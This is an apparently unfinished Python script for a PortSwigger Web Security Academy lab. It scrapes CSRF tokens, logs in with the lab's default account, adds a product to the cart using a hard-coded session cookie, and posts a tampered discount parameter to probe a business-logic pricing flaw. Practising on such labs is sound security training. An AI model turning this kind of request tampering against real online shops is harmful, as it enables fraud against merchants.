import requests
import string
from bs4 import BeautifulSoup

arr = string.ascii_lowercase + string.digits

URL = 'https://0aee00b303dcd017802e8b080099009e.web-security-academy.net'

session = requests.Session()

##################
# Phase 1: Login #
##################

response = session.get(URL+'/login')
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
csrf_input = form.find('input', {'name': 'csrf'})
if csrf_input is None:
    print("[-] CSRF token not found in login page")
    exit(1)

csrf_value = csrf_input.get('value')
print(f"[+] Found CSRF token: {csrf_value}")

response = session.post(URL+'/login', data={'csrf': csrf_value, 'username': 'wiener', 'password': 'peter'})
print("[+] Logged in as wiener")


###############################
# Phase 2: Add voucher to cart #
###############################
data = {'productId': '2',
        'redir': 'PRODUCT',
        'quantity': '1'}
referer_url = URL + '/product?productId=2'
session.post(URL+'/cart', data=data, headers={'Referer': referer_url, 'Cookie': 'session=I1iSODdxVu9pIyv1SDf2bYstYf3IrZkU'} )


#################################
# Phase 3: Add discount to cart #
#################################
response = session.get(URL+'/cart')

soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')
csrf_input = form.find('input', {'name': 'csrf'})
if csrf_input is None:
    print("[-] CSRF token not found in login page")
    exit(1)
csrf_value = csrf_input.get('value')
print(f"[+] Found CSRF token: {csrf_value}")
data = {'csrf': csrf_value, 'coupon': 'SIGNUP30'}
response = session.post(URL+'/cart', data={'csrf': csrf_value, 'discount': '0'}, headers={'Cookie': f'session=I1iSODdxVu9pIyv1SDf2bYstYf3IrZkU'})
    
print(response.text)
# soup = BeautifulSoup(response.text, 'html.parser')
# form = soup.find('form')
# csrf_input = form.find('input', {'name': 'csrf'})
# if csrf_input is None:
#     print("[-] CSRF token not found in login page")
#     exit(1)

# csrf_value = csrf_input.get('value')
# print(f"[+] Found CSRF token: {csrf_value}")